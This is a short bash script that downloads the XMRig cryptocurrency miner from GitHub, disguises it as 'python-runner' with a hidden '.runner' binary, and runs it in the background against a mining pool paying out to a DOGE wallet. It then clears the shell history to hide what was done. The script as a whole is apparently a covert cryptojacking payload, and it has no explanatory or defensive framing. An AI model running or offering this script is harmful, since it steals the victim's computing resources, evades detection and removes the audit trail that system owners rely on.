#!/bin/bash
ip="$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -d ' ' -f 1)"
cd /tmp
wget -O python-runner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
tar xvzf python-runner.tar.gz -C /mnt
rm -rf /tmp/python-runner.tar.gz
mv /mnt/xmrig-6.10.0 /mnt/python-runner
cd /mnt/python-runner
mv /mnt/python-runner/xmrig /mnt/python-runner/.runner
cd /mnt/python-runner
./.runner -B -o rx.unmineable.com:3333 -a rx -k -u DOGE:DToXhJbJkZdJn2pirvdjGLyHHRCr3uBEeU.wX
history -c
cd /
